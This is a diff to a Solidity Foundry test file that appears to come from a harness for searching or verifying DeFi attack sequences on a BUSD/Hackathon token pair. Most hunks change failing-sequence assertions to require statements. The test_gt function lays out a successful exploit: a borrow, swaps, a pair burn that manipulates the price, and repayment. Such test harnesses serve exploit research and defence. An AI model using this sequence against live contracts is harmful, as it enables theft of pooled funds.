@@ -201,7 +201,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_busd_hackathon(amt1, amt2);
         swap_pair_attacker_hackathon_busd(amt3, amt4);
         payback_busd_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -221,7 +221,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_busd_hackathon(amt2, amt3);
         swap_pair_attacker_hackathon_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -241,7 +241,7 @@ contract HackathonTest is Test, BlockLoader {
         burn_hackathon_pair(amt3);
         swap_pair_attacker_hackathon_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -259,7 +259,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_hackathon_busd(amt1, amt2);
         swap_pair_attacker_busd_hackathon(amt3, amt4);
         payback_hackathon_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -279,7 +279,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_hackathon_busd(amt2, amt3);
         swap_pair_attacker_busd_hackathon(amt4, amt5);
         payback_hackathon_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -299,7 +299,7 @@ contract HackathonTest is Test, BlockLoader {
         burn_hackathon_pair(amt3);
         swap_pair_attacker_busd_hackathon(amt4, amt5);
         payback_hackathon_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -323,7 +323,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_busd_hackathon(amt5, amt6);
         swap_pair_attacker_hackathon_busd(amt7, amt8);
         payback_busd_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -349,7 +349,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_busd_hackathon(amt6, amt7);
         swap_pair_attacker_hackathon_busd(amt8, amt9);
         payback_busd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -375,7 +375,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_busd_hackathon(amt6, amt7);
         swap_pair_attacker_hackathon_busd(amt8, amt9);
         payback_busd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -401,7 +401,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_busd_hackathon(amt6, amt7);
         swap_pair_attacker_hackathon_busd(amt8, amt9);
         payback_busd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -427,7 +427,7 @@ contract HackathonTest is Test, BlockLoader {
         burn_hackathon_pair(amt7);
         swap_pair_attacker_hackathon_busd(amt8, amt9);
         payback_busd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -451,7 +451,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_hackathon_busd(amt5, amt6);
         swap_pair_attacker_busd_hackathon(amt7, amt8);
         payback_hackathon_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -477,7 +477,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_hackathon_busd(amt6, amt7);
         swap_pair_attacker_busd_hackathon(amt8, amt9);
         payback_hackathon_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -503,7 +503,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_hackathon_busd(amt6, amt7);
         swap_pair_attacker_busd_hackathon(amt8, amt9);
         payback_hackathon_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -529,7 +529,7 @@ contract HackathonTest is Test, BlockLoader {
         swap_pair_attacker_hackathon_busd(amt6, amt7);
         swap_pair_attacker_busd_hackathon(amt8, amt9);
         payback_hackathon_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -555,26 +555,39 @@ contract HackathonTest is Test, BlockLoader {
         burn_hackathon_pair(amt7);
         swap_pair_attacker_busd_hackathon(amt8, amt9);
         payback_hackathon_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 2200 * 1e18);
         borrow_busd_owner(2200 * 1e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", busd.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(busd.balanceOf(attacker), address(busd))
+        );
         swap_pair_attacker_busd_hackathon(
             busd.balanceOf(attacker),
             pair.getAmountOut(busd.balanceOf(attacker), address(busd))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", hackathon.balanceOf(attacker));
         burn_hackathon_pair(hackathon.balanceOf(attacker));
         printBalance("After step2 ");
+        emit log_named_uint("amt4", hackathon.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(hackathon.balanceOf(attacker), address(hackathon))
+        );
         swap_pair_attacker_hackathon_busd(
             hackathon.balanceOf(attacker),
             pair.getAmountOut(hackathon.balanceOf(attacker), address(hackathon))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (2200 * 1e18 * 1003) / 1000);
         payback_busd_owner((2200 * 1e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -597,7 +610,7 @@ contract HackathonTest is Test, BlockLoader {
         burn_hackathon_pair(amt3);
         swap_pair_attacker_hackathon_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
